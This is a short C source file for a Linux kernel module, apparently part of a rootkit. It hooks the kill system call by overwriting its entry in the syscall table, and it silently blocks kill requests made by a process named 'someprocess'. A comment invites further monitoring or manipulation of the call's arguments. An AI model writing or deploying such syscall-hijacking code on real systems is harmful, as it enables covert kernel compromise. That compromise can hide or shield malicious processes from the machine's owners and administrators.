#include "common.h"
#include <asm/uaccess.h>
#include <linux/sched.h>

asmlinkage long (*sys_kill)(int pid, int sig);

long hook_kill(int pid, int sig)
{
    /* Monitor/manipulate sys_kill() arguments here */
#if __DEBUG_KILL__
    DEBUG_KILL("%s, pid=%d, sig=%d\n",__func__, pid, sig);
    DEBUG_KILL("%s, task name=%s, task id=%d\n",__func__, current->comm, current->pid);
#endif
    if( ! strcmp(current->comm, "someprocess") )
        return 1;
    return 0;
}

asmlinkage long n_sys_kill(int pid, int sig)
{
    long ret;

    if(hook_kill(pid, sig))
        return 0;

    hijack_pause(sys_kill);
    ret = sys_kill(pid, sig);
    hijack_resume(sys_kill);

    return ret;
}

void kill_init ( void )
{
    DEBUG("Hooking sys_kill\n");

    sys_kill = (void *)sys_call_table[__NR_kill];
    hijack_start(sys_kill, &n_sys_kill);
}

void kill_exit ( void )
{
    DEBUG("Unhooking sys_kill\n");

    hijack_stop(sys_kill);
}
